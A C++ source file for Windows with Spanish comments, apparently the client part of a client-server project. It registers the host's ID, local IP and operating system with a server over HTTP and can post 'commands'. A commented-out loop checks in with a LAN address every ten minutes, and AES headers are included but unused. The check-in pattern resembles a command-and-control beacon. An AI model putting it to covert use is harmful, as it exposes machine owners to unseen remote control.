#include <cryptopp/aes.h>
#include <cryptopp/filters.h>
#include <cryptopp/modes.h>
#include <cryptopp/files.h>
#include <cryptopp/osrng.h>
#include <cryptopp/hex.h>
#include <iostream>
#include <fstream>
#include <iostream>
#include <curl/curl.h>
#include <chrono>
#include <thread>
#include <sstream>
#include <nlohmann/json.hpp>
#include <winsock2.h>
#include <iphlpapi.h>
#include <iostream>
#include <sstream>
#include <cstring>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

using namespace CryptoPP;
using json = nlohmann::json;
#include <iostream>
#include <curl/curl.h>
#include <chrono>
#include <thread>


std::string GetLocalIPAddress() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {

        std::cerr << "WSAStartup failed.\n";
        return "";
    }

    char hostName[256];
    if (gethostname(hostName, sizeof(hostName)) == SOCKET_ERROR) {
        std::cerr << "Error " << WSAGetLastError() <<
            " when getting local host name.\n";
        return "";

    }

    struct addrinfo hints, * res, * ptr;
    memset(&hints, 0, sizeof(hints));

    hints.ai_family = AF_INET; 
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(hostName, NULL, &hints, &res) != 0) {
        WSACleanup();
        return "";
    }

    std::string localIP;
    for (ptr = res; ptr != NULL; ptr = ptr->ai_next) {
        char ipStr[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &((struct sockaddr_in*)ptr->ai_addr)->sin_addr, ipStr, sizeof(ipStr));
        localIP = ipStr;
        break; 
    }

    freeaddrinfo(res);
    WSACleanup();

    return localIP;

}

static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

void GetRequest(const std::string& url) {

    CURL* curl;
    CURLcode res;
    std::string readBuffer;

    curl = curl_easy_init();
    if (curl) {

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
        }
        else {
            std::cout << readBuffer << std::endl;
        }
        curl_easy_cleanup(curl);
    }
}

void PostRequest(const std::string& url, const std::string& postData) {

    CURL* curl;
    CURLcode res;

    curl = curl_easy_init();

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
        }
        curl_easy_cleanup(curl);

    }
}


void PostCommand(const std::string& url, int clientId, const std::string& command) {
    CURL* curl;
    CURLcode res;

    std::ostringstream postDataStream;
    postDataStream << "{\"client_id\":" << clientId << ",\"command\":\"" << command << "\"}";
    std::string postData = postDataStream.str();

    curl = curl_easy_init();
    if (curl) {
      
        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");

        // Configuración de la petición POST
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
        }

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
}

void PostAddClient(const std::string& url, const std::string& clientId, const std::string& operatingSystem) {

    CURL* curl;
    CURLcode res;

    std::string ipAddress = GetLocalIPAddress();

    std::ostringstream postDataStream;
    postDataStream << "{\"client_id\":\"" << clientId << "\",\"ip_address\":\"" << ipAddress << "\",\"operating_system\":\"" << operatingSystem << "\"}";
    std::string postData = postDataStream.str();

 
    curl = curl_easy_init();
    if (curl) {
        
        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
        }

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
}

/*
int main() {
    while (true) {
        // Reemplazar con la URL correcta del servidor
        std::string serverUrl = "http://192.168.1.26:8000/clients/";

        PostAddClient(serverUrl, "newClientIdIdId", "Windows");
        // Ejemplo de envío de un comando cada 10 minutos
        //PostCommand(serverUrl, 1, "exampleCommand");
        std::this_thread::sleep_for(std::chrono::minutes(10));
    }
    return 0;
}*/